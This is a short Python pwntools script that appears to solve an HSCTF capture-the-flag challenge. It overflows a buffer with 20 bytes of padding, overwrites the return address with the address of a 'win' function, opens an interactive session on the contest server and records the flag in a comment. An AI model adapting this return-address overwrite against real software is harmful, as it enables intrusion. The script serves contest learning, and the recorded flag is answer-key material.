from pwn import * 
connection = remote('pwn.hsctf.com', 1234)
#through fuzzing we found buffer
offset = 20
#through objdump -d we found the address of win as 0x080491b6
#0x080491e1 is address of vuln 
address = p32(0x080491b6)
#perform the bufferoverflow itself
connection.sendline('a'*offset + address)
#after performing the buffer overflow we still need to cat the flag
connection.interactive()

#The flag is hsctf{fedex_dont_fail_me_now}

